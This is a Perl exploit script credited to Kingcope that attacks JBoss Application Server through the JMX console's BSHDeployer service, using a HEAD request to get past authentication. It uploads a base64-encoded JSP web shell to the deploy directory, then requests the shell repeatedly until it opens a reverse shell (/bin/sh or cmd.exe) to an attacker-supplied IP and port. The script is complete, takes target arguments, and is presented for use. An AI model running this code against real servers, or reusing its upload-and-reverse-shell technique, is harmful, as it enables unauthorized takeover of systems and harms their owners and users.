#JBoss AS Remote Exploit v2 (with auth bypass)
#by Kingcope
#####

use IO::Socket::SSL;
use LWP::UserAgent;
use URI::Escape;
use MIME::Base64;

sub usage {
    print "JBoss AS Remote Exploit\nby Kingcope\n\nusage: perl jboss.pl <target> <targetport> <yourip> <yourport> <win/lnx>\n";
    print "example: perl daytona.pl 192.168.2.10 8080 192.168.2.2 443 lnx\n";
    exit;
}

if ($#ARGV != 4) { usage; }

$host = $ARGV[0];
$port = $ARGV[1];
$myip = $ARGV[2];
$myport = $ARGV[3];
$com = $ARGV[4];

if ($com eq "lnx") {
    $comspec = "/bin/sh";
}

if ($com eq "win") {
    $comspec = "cmd.exe";
}

$|=1;

$jsp="
<%@
page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"
%>
            <%!
                static class StreamConnector extends Thread
                {
                    InputStream is;
                    OutputStream os;

                    StreamConnector( InputStream is, OutputStream os )
                    {
                        this.is = is;
                        this.os = os;
                    }

                    public void run()
                    {
                        BufferedReader in  = null;
                        BufferedWriter out = null;
                        try
                        {
                            in  = new BufferedReader( new InputStreamReader( this.is ) );
                            out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                            char buffer[] = new char[8192];
                            int length;
                            while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
                            {
                                out.write( buffer, 0, length );
                                out.flush();
                            }
                        } catch( Exception e ){}
                        try
                        {
                            if( in != null )
                                in.close();
                            if( out != null )
                                out.close();
                        } catch( Exception e ){}
                    }
                }
            %>
            <%
                try
                {
                    Socket socket = new Socket( \"$myip\", $myport );
                    Process process = Runtime.getRuntime().exec( \"$comspec\" );
                    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
                    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
                } catch( Exception e ) {}
            %>";

#print $jsp;exit;

srand(time());

sub randstr
{
    my $length_of_randomstring=shift;# the length of
             # the random string to generate

    my @chars=('a'..'z','A'..'Z');
    my $random_string;
    foreach (1..$length_of_randomstring)
    {
        # rand @chars will generate a random
        # number between 0 and scalar @chars
        $random_string.=$chars[rand @chars];
    }
    return $random_string;
}

$appbase = randstr(8);
$jspname = randstr(8);

print "APPBASE=$appbase\nJSPNAME=$jspname\n";

$bsh_script =
qq{import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String val = "} . encode_base64($jsp, "") .  qq{";

BASE64Decoder decoder = new BASE64Decoder();
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/} . $appbase . ".war" . qq{").mkdir();
byte[] byteval = decoder.decodeBuffer(val);
String jsp_file = jboss_home + "/deploy/} . $appbase . ".war/" . $jspname . ".jsp" . qq{";
FileOutputStream fstream = new FileOutputStream(jsp_file);
fstream.write(byteval);
fstream.close(); };

#
# UPLOAD
#

$params = 'action=invokeOpByName&name=jboss.deployer:service=BSHDeployer&methodName=createScriptDeployment&argType=java.lang.String&arg0=' . uri_escape($bsh_script)
.
'&argType=java.lang.String&arg1=' . randstr(8) . '.bsh';

my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13");
$ua->ssl_opts(verify_hostname => 0,
              SSL_verify_mode => 0x00);


my $req = HTTP::Request->new(HEAD => "https://$host:$port/jmx-console/HtmlAdaptor?$params");
#  $req->content_type('application/x-www-form-urlencoded');
 # $req->content($params);

  print "UPLOAD... ";
  my $res = $ua->request($req);

  # Dont get confused by the 500 it is h4xed
  if ($res->status_line =~ /500/ or $res->status_line =~ /200/) {
      print "SUCCESS\n";
      print $res->content;
      print "EXECUTE";
      sleep(5);
      $uri = '/' . $appbase . '/' . $jspname . '.jsp';

      for ($k=0;$k<10;$k++) {
      my $ua = LWP::UserAgent->new;
      $ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13");
      $ua->ssl_opts(verify_hostname => 0,
              SSL_verify_mode => 0x00);
      my $req = HTTP::Request->new(GET => "https://$host:$port$uri");
      my $res = $ua->request($req);

        if ($res->is_success) {
            print "\nSUCCESS\n";
            exit;
        } else {
            print ".";
               print $res->status_line."\n";

            sleep(5);
        }
      }
      print "UNSUCCESSFUL\n";
  }
  else {
      print "UNSUCCESSFUL\n";
      print $res->status_line, "\n";
      exit;
  }
